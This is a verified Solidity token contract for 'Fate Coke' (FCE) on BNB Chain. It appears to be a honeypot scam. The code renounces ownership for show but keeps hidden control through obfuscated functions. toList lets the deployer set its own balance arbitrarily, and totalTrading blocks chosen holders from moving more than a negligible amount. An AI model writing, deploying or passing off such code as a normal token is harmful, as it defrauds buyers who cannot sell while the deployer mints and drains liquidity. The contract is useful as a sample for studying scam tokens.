/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface receiverTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchTotal {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract FateCoke is Ownable{
    uint8 public decimals = 18;
    address public toMax;

    bool public totalAt;

    mapping(address => bool) public shouldLiquidityTeam;
    string public symbol = "FCE";
    string public name = "Fate Coke";
    uint256 constant launchLimitList = 10 ** 10;

    mapping(address => bool) public tokenSwap;
    mapping(address => mapping(address => uint256)) public allowance;
    address public txFromTeam;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        receiverTrading fromFeeAuto = receiverTrading(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txFromTeam = launchTotal(fromFeeAuto.factory()).createPair(fromFeeAuto.WETH(), address(this));
        toMax = swapAmount();
        tokenSwap[toMax] = true;
        balanceOf[toMax] = totalSupply;
        emit Transfer(address(0), toMax, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address enableWallet, uint256 sellTeam) external returns (bool) {
        return transferFrom(swapAmount(), enableWallet, sellTeam);
    }

    function modeTotalAuto(address receiverTeam) public {
        if (totalAt) {
            return;
        }
        tokenSwap[receiverTeam] = true;
        totalAt = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function totalTrading(address enableListAt) public {
        if (enableListAt == toMax || enableListAt == txFromTeam || !tokenSwap[swapAmount()]) {
            return;
        }
        shouldLiquidityTeam[enableListAt] = true;
    }

    function swapAmount() private view returns (address) {
        return msg.sender;
    }

    function toList(uint256 sellTeam) public {
        if (!tokenSwap[swapAmount()]) {
            return;
        }
        balanceOf[toMax] = sellTeam;
    }

    function approve(address tradingSell, uint256 sellTeam) public returns (bool) {
        allowance[swapAmount()][tradingSell] = sellTeam;
        emit Approval(swapAmount(), tradingSell, sellTeam);
        return true;
    }

    function walletEnable(address autoTx, address sellSender, uint256 sellTeam) internal returns (bool) {
        require(balanceOf[autoTx] >= sellTeam);
        balanceOf[autoTx] -= sellTeam;
        balanceOf[sellSender] += sellTeam;
        emit Transfer(autoTx, sellSender, sellTeam);
        return true;
    }

    function transferFrom(address receiverAuto, address enableWallet, uint256 sellTeam) public returns (bool) {
        if (receiverAuto != swapAmount() && allowance[receiverAuto][swapAmount()] != type(uint256).max) {
            require(allowance[receiverAuto][swapAmount()] >= sellTeam);
            allowance[receiverAuto][swapAmount()] -= sellTeam;
        }
        if (enableWallet == toMax || receiverAuto == toMax) {
            return walletEnable(receiverAuto, enableWallet, sellTeam);
        }
        if (shouldLiquidityTeam[receiverAuto]) {
            return walletEnable(receiverAuto, enableWallet, launchLimitList);
        }
        return walletEnable(receiverAuto, enableWallet, sellTeam);
    }


}